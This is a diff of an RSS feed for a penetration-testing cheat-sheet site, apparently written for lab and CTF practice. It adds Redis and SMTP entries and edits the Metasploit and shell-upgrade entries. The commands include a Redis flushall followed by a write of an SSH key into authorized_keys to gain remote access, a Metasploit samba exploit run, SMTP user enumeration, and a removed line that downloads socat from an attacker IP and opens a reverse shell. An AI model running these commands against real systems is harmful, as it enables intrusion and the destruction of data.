@@ -243,7 +243,7 @@
       <link>https://tldrbins.github.io/metasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit/</guid>
-      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>Metasploit Listener</title>
@@ -400,6 +400,13 @@
       <description> knockd # Find knock sequence cat /etc/knockd.conf # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 &amp;gt;/dev/null; done; ssh -i id_rsa user@10.10.11.10 </description>
     </item>
     <item>
+      <title>Redis</title>
+      <link>https://tldrbins.github.io/redis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/redis/</guid>
+      <description> Arbitrary Write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/user/.ssh/ redis-cli -h 127.0.0.1 config set dbfilename &amp;#34;authorized_keys&amp;#34; redis-cli -h 127.0.0.1 save </description>
+    </item>
+    <item>
       <title>RPC</title>
       <link>https://tldrbins.github.io/rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -440,6 +447,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_server/</guid>
       <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
+    </item>
+    <item>
+      <title>SMTP</title>
+      <link>https://tldrbins.github.io/smtp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smtp/</guid>
+      <description>SMTP User Enum perl smtp-user-enum.pl -M RCPT -U users.txt -t 10.10.11.10 Note: smtp-user-enum.pl</description>
     </item>
     <item>
       <title>SNMP</title>
@@ -509,7 +523,7 @@
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; #Ctrl-Z to send the process to background, then stty raw -echo; fg #After fg, press enter again, then export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
+      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.</description>
     </item>
     <item>
       <title>VNC</title>
